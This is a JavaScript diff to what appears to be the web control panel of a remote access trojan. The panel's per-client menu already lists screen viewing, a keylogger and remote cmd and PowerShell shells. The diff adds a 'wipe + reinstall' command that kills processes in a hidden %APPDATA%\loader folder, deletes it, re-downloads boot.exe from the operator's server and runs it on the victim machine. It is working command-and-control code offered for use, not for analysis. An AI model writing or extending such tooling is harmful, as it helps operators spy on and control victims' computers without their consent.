@@ -277,7 +277,7 @@ function openGearMenu(anchor, c) {
   const menu = document.createElement('div');
   menu.className = 'gear-menu';
   menu.style.top  = `${rect.bottom + 4}px`;
-  menu.style.left = `${rect.right - 220}px`;
+  menu.style.left = `${rect.right - 240}px`;
   menu.innerHTML = `
     <div class="title">${esc(c.hostname)}</div>
     <div class="item" data-item="rdp">screen (rdp)</div>
@@ -286,6 +286,8 @@ function openGearMenu(anchor, c) {
     <div class="sep"></div>
     <div class="item" data-item="cmd">remote shell — cmd</div>
     <div class="item" data-item="ps">remote shell — powershell</div>
+    <div class="sep"></div>
+    <div class="item" data-item="wipe" style="color:var(--red)">wipe + reinstall</div>
   `;
   menu.querySelectorAll('[data-item]').forEach((el) => {
     el.addEventListener('click', (ev) => {
@@ -297,10 +299,34 @@ function openGearMenu(anchor, c) {
       else if (it === 'keylog') openKeylog(c);
       else if (it === 'cmd') openConsole(c, 'cmd');
       else if (it === 'ps') openConsole(c, 'powershell');
+      else if (it === 'wipe') wipeClient(c);
     });
   });
   document.body.appendChild(menu);
   gearMenuEl = menu;
+}
+
+async function wipeClient(c) {
+  const ok = confirm(
+    `wipe + reinstall on ${c.hostname}?\n\n` +
+    `this kills every process in %APPDATA%\\loader, wipes the folder, ` +
+    `re-downloads boot.exe from your server, and runs it.\n\n` +
+    `the client will disappear for 15–30s, then come back.`
+  );
+  if (!ok) return;
+
+  const r = await fetch(`/api/clients/${c.id}/wipe`, {
+    method: 'POST',
+    credentials: 'same-origin',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({}),
+  });
+  const d = await r.json().catch(() => ({}));
+  if (r.ok) {
+    alert(`wipe command queued for ${c.hostname}\n\nthe client will pick it up within ~3s.`);
+  } else {
+    alert(`failed: ${d.error || r.status}`);
+  }
 }
 
 function openConsole(c, shell) {
